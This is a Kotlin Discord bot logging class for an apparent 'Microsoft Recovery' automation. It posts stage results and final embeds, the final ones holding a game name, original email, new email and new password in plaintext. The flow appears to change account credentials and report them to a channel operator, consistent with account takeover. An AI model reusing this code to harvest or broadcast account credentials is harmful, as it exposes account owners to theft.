package discord

import dev.kord.common.Color
import dev.kord.common.entity.ButtonStyle
import dev.kord.common.entity.Snowflake
import dev.kord.core.Kord
import dev.kord.core.behavior.channel.createEmbed
import dev.kord.core.behavior.channel.createMessage
import dev.kord.core.entity.channel.TextChannel
import dev.kord.rest.builder.message.actionRow
import dev.kord.rest.builder.message.embed
import org.slf4j.LoggerFactory

class DiscordLogger(
    private val kord: Kord,
) {
    private val logger = LoggerFactory.getLogger(DiscordLogger::class.java)

    private val greenColor = Color(87, 242, 135)
    private val redColor = Color(237, 66, 69)

    suspend fun logStage(
        logChannelId: Long,
        stageKey: String,
        stageName: String,
        isSuccess: Boolean,
        detail: String,
    ) {
        if (logChannelId == 0L) return
        try {
            val channel = kord.getChannelOf<TextChannel>(Snowflake(logChannelId))
            if (channel == null) {
                logger.warn("Log channel {} not found", logChannelId)
                return
            }

            val statusText = if (isSuccess) "Success" else "Failure"
            val embedColor = if (isSuccess) greenColor else redColor

            channel.createEmbed {
                title = "Stage $stageKey: $stageName - $statusText"
                description = detail
                color = embedColor
            }
        } catch (e: Exception) {
            logger.error("Failed to send stage log embed to channel {}: {}", logChannelId, e.message)
        }
    }

    suspend fun sendFinalResult(
        notiChannelId: Long,
        isSuccess: Boolean,
        ign: String,
        originalEmail: String,
        newEmail: String? = null,
        password: String? = null,
        errorReason: String? = null,
    ) {
        if (notiChannelId == 0L) return
        try {
            val channel = kord.getChannelOf<TextChannel>(Snowflake(notiChannelId))
            if (channel == null) {
                logger.warn("Notification channel {} not found", notiChannelId)
                return
            }

            if (isSuccess) {
                channel.createEmbed {
                    title = "✅ Khôi phục thành công"
                    color = greenColor
                    field("IGN", true) { ign }
                    field("Email gốc", true) { originalEmail }
                    field("Email mới", false) { newEmail ?: "N/A" }
                    field("Password mới", false) { password ?: "N/A" }
                }
            } else {
                channel.createEmbed {
                    title = "❌ Khôi phục thất bại"
                    color = redColor
                    field("IGN", true) { ign }
                    field("Email gốc", true) { originalEmail }
                    field("Lý do lỗi", false) { errorReason ?: "Lỗi không xác định" }
                }
            }
        } catch (e: Exception) {
            logger.error("Failed to send final result embed to channel {}: {}", notiChannelId, e.message)
        }
    }

    suspend fun sendInitialEmbed(notiChannelId: Long) {
        if (notiChannelId == 0L) return
        try {
            val channel = kord.getChannelOf<TextChannel>(Snowflake(notiChannelId))
            if (channel == null) {
                logger.warn("Notification channel {} not found", notiChannelId)
                return
            }

            channel.createMessage {
                embed {
                    title = "Birrii Auto Secure - Microsoft Recovery"
                    description = "Hệ thống tự động bảo mật & khôi phục tài khoản Microsoft. Nhấn nút bên dưới để bắt đầu."
                    color = Color(88, 101, 242)
                }
                actionRow {
                    interactionButton(ButtonStyle.Primary, "start_recovery_btn") {
                        label = "Bắt đầu khôi phục"
                    }
                }
            }
        } catch (e: Exception) {
            logger.error("Failed to send initial recovery embed: {}", e.message)
        }
    }
}
